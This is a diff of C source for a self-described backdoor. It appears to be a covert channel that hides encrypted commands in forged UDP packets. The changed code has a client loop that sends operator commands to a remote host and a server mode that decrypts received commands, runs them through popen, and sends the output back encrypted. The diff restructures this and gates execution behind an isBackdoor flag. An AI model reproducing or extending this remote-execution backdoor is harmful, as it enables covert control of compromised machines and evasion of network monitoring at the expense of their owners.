@@ -93,25 +93,31 @@ int main(int argc, char **argv)
         fprintf(stdout, "Client..\n");
         int cypher_len = 0;
         unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
+        char *command;
         bool more = true;
 
         while (more)
         {
-            cypher_len = forgepacket(ciphertext, getInput(), BUFF_SIZE);
-            client(source_host, dest_host, dest_port, ciphertext, cypher_len);
-
-            fprintf(stdout, "Backdoor..\n");
-            server(dest_host, source_host, dest_port);
-
-            if (strcmp("exit", getInput()) == 0)
+            command = getInput();
+            if (strcmp("exit", command) == 0)
                 more = false;
+            else
+            {
+                cypher_len = forgepacket(ciphertext, command, BUFF_SIZE);
+                client(source_host, dest_host, dest_port, ciphertext, cypher_len);
+
+                fprintf(stdout, "Listen from Backdoor..\n");
+                server(dest_host, source_host, dest_port, false);
+            }
         }
     }
     else
     {
-        fprintf(stdout, "Backdoor..\n");
-        while (server(source_host, dest_host, dest_port))
-            ;
+        for (int i = 0; i < 2; i++)
+        {
+            fprintf(stdout, "Backdoor Open..\n");
+            server(source_host, dest_host, dest_port, true);
+        }
     }
 
     return 0;
@@ -276,7 +282,7 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
  * Server function for unvealing the message from the UDP header and
  * writing the the message to a file.
  * -----------------------------------------------------------------------*/
-bool server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port)
+void server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, bool isBackdoor)
 {
     FILE *fp;
     int recv_socket;
@@ -326,28 +332,27 @@ bool server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                 // Received everything
                 if (pc == size)
                 {
-                    fprintf(stdout, "Original: %s\n", commandBuffer);
-
-                    // DECRYPT AND EXECUTE
+                    // DECRYPT
                     char *decryptedtext = (char *)malloc(size);
-                    int decryptedtext_len = decrypt((unsigned char *)commandBuffer, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)decryptedtext);
+                    decrypt((unsigned char *)commandBuffer, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)decryptedtext);
 
-                    fprintf(stdout, "Decypher: %d | %s\n", decryptedtext_len, decryptedtext);
+                    fprintf(stdout, "Decypher: %s\n\n", decryptedtext);
 
-                    // Get Output
-                    char *output = (char *)malloc(OUTPUT_SIZE);
-                    fp = popen(decryptedtext, "r");
-                    fread(output, 1, OUTPUT_SIZE, fp);
-                    fprintf(stdout, "Return: %s \n", output);
+                    // if Backdoor EXECUTE command
+                    if (isBackdoor)
+                    {
+                        char *output = (char *)malloc(OUTPUT_SIZE);
+                        fp = popen(decryptedtext, "r");
+                        fread(output, 1, OUTPUT_SIZE, fp);
+                        fprintf(stdout, "Return: %s \n", output);
+                        // Cypher
+                        unsigned char *ciphertext = (unsigned char *)malloc(OUTPUT_SIZE * 2);
+                        int cypher_len = forgepacket(ciphertext, output, OUTPUT_SIZE);
+                        // Send
+                        client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
+                    }
 
-                    // Cypher
-                    unsigned char *ciphertext = (unsigned char *)malloc(OUTPUT_SIZE * 2);
-                    int cypher_len = forgepacket(ciphertext, output, OUTPUT_SIZE);
-
-                    // Send
-                    client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
                     open = false;
-
                     // Reset Counters
                     packet_count = 0;
                     size = 0;
@@ -356,7 +361,7 @@ bool server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         }
         close(recv_socket); /* close the socket so we don't hose the kernel */
     }
-    return true;
+    fprintf(stdout, "Backdoor Closed");
 }
 
 /*--------------------------------------------------------------------------
